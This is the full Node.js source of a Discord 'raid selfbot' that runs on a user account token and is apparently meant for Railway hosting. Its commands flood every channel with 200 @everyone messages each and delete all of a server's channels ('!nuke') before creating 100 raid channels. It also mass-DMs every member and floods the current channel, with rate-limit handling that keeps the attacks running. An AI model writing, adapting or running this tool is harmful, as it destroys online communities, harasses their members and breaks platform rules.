const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Spam selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !spamall in any channel to flood all channels with 200 messages`);
    console.log(`Type !nuke to delete all channels and create 100 raid channels`);
    console.log(`Type !help for all commands`);
});

client.on('messageCreate', async (message) => {
    // Only respond to your own messages
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== HELP COMMAND =====
    if (command === 'help') {
        const helpMsg = `**🔞 RAID SELFBOT COMMANDS**

**!spamall** - Send 200 messages to EVERY channel
**!nuke** - Delete all channels, create 100 raid channels
**!spamchannels [number]** - Create X channels with raid message
**!massdm [message]** - DM all server members
**!flood [count]** - Flood current channel with messages
**!status** - Check bot stats and permissions
**!help** - Show this menu

💀 **RAIDED BY VAMBO**`;
        await message.reply(helpMsg);
    }

    // ===== SPAM ALL EXISTING CHANNELS (200 MESSAGES EACH) =====
    if (command === 'spamall') {
        const guild = message.guild;
        if (!guild) {
            message.reply('This command only works in servers!');
            return;
        }

        const messagesPerChannel = 200;

        await message.reply(`🔥 **MEGA SPAM INITIATED**\nSending **200 messages** to EVERY channel in **${guild.name}**\nThis will take a while...`);

        const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        const textChannels = guild.channels.cache.filter(c => 
            (c.type === 'GUILD_TEXT' || c.type === 'GUILD_NEWS') && 
            c.permissionsFor(guild.members.me).has('SendMessages')
        );

        console.log(`📊 Found ${textChannels.size} text channels to spam in ${guild.name}`);
        
        let totalSent = 0;
        let totalFailed = 0;
        let channelsCompleted = 0;
        let startTime = Date.now();

        for (const [channelId, channel] of textChannels) {
            channelsCompleted++;
            console.log(`\n📢 Channel ${channelsCompleted}/${textChannels.size}: #${channel.name}`);
            
            let channelSuccess = 0;

            for (let i = 1; i <= messagesPerChannel; i++) {
                try {
                    await channel.send(raidMessage);
                    channelSuccess++;
                    totalSent++;
                    
                    if (i % 20 === 0) {
                        console.log(`   Progress: ${i}/200 messages sent in #${channel.name}`);
                    }
                    
                    await new Promise(resolve => setTimeout(resolve, 600));
                    
                } catch (error) {
                    totalFailed++;
                    console.log(`   ❌ Failed message ${i} in #${channel.name}: ${error.message}`);
                    
                    if (error.message.includes('rate')) {
                        console.log('   ⏳ Rate limited, waiting 5 seconds...');
                        await new Promise(resolve => setTimeout(resolve, 5000));
                    } else {
                        break;
                    }
                }
            }

            console.log(`   ✅ #${channel.name}: ${channelSuccess}/${messagesPerChannel} messages sent`);
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

        let endTime = Date.now();
        let minutes = Math.floor((endTime - startTime) / 60000);
        let seconds = Math.floor(((endTime - startTime) % 60000) / 1000);

        const report = `**✅ MEGA SPAM COMPLETE!**

📊 **RESULTS:**
• Server: **${guild.name}**
• Channels hit: **${textChannels.size}**
• Messages per channel: **${messagesPerChannel}**
• Total messages sent: **${totalSent}**
• Failed messages: **${totalFailed}**
• Time taken: **${minutes}m ${seconds}s**

💀 **RAIDED BY VAMBO**`;

        try {
            await message.channel.send(report);
        } catch (e) {
            console.log('Could not send final report');
        }

        console.log('\n' + '='.repeat(50));
        console.log('💀 **MEGA SPAM COMPLETE** 💀');
        console.log(`Server: ${guild.name}`);
        console.log(`Messages sent: ${totalSent}`);
        console.log('='.repeat(50));
    }

    // ===== FULL NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        if (!guild) return;

        await message.reply('💣 **NUKE INITIATED** - Deleting ALL channels...');
        console.log(`Starting nuke on ${guild.name}`);

        // Delete all channels
        let deletedCount = 0;
        const channels = [...guild.channels.cache.values()];
        
        for (const channel of channels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted: ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 300));
            } catch (error) {
                console.log(`❌ Failed to delete ${channel.name}: ${error.message}`);
            }
        }
        
        console.log(`✅ Deleted ${deletedCount} channels`);

        // Create 100 raid channels
        console.log(`🔥 Creating 100 raid channels...`);
        
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        let createdCount = 0;

        for (let i = 1; i <= 100; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                createdCount++;
                console.log(`✅ Created channel ${i}/100`);
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                console.log(`❌ Failed to create channel ${i}: ${error.message}`);
                if (error.message.includes('rate')) {
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
        }

        console.log('='.repeat(50));
        console.log('💀 **NUKE COMPLETE** 💀');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${createdCount} raid channels`);
        console.log('='.repeat(50));
    }

    // ===== CREATE SPAM CHANNELS =====
    if (command === 'spamchannels') {
        const guild = message.guild;
        if (!guild) return;

        let channelCount = parseInt(args[0]) || 10;
        if (channelCount > 50) channelCount = 50;

        await message.reply(`🔥 Creating **${channelCount}** channels...`);

        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        let created = 0;

        for (let i = 0; i < channelCount; i++) {
            try {
                const suffix = i > 0 ? `-${i}` : '';
                const newChannel = await guild.channels.create(channelName + suffix, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                created++;
                console.log(`✅ Created channel #${i+1}`);
                await new Promise(resolve => setTimeout(resolve, 800));
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }

        await message.reply(`✅ Created ${created} channels!`);
    }

    // ===== MASS DM =====
    if (command === 'massdm') {
        const guild = message.guild;
        const dmMessage = args.join(' ') || `@everyone RAIDED BY VAMBO`;

        await message.reply(`📨 Sending DMs to ${guild.memberCount} members...`);

        let sent = 0;
        let failed = 0;

        for (const member of guild.members.cache.values()) {
            if (member.user.bot || member.id === client.user.id) continue;

            try {
                await member.send(dmMessage);
                sent++;
                console.log(`✅ DM sent to ${member.user.tag}`);
                await new Promise(resolve => setTimeout(resolve, 1500));
            } catch (e) {
                failed++;
                console.log(`❌ Failed to DM ${member.user.tag}`);
            }
        }

        await message.reply(`✅ DMs sent: ${sent}, Failed: ${failed}`);
    }

    // ===== FLOOD CURRENT CHANNEL =====
    if (command === 'flood') {
        const count = parseInt(args[0]) || 50;
        const channel = message.channel;

        await message.reply(`🌊 Flooding with ${count} messages...`);

        for (let i = 0; i < count; i++) {
            try {
                await channel.send(`@everyone **RAIDED BY VAMBO** - Wave ${i+1}/${count}`);
                await new Promise(resolve => setTimeout(resolve, 300));
            } catch (e) {
                console.log(`Rate limited, waiting...`);
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    }

    // ===== STATUS COMMAND =====
    if (command === 'status') {
        const guild = message.guild;
        const member = guild.members.cache.get(client.user.id);

        const statusMsg = `**📊 SELFBOT STATUS**

**Account:** ${client.user.tag}
**Servers:** ${client.guilds.cache.size}
**Current Server:** ${guild.name}

**Your Permissions:**
• Manage Channels: ${member.permissions.has('ManageChannels') ? '✅' : '❌'}
• Send Messages: ${member.permissions.has('SendMessages') ? '✅' : '❌'}
• Administrator: ${member.permissions.has('Administrator') ? '✅' : '❌'}

**Uptime:** Running 24/7 on Railway
**Prefix:** !`;

        await message.reply(statusMsg);
    }
});

client.login(TOKEN);
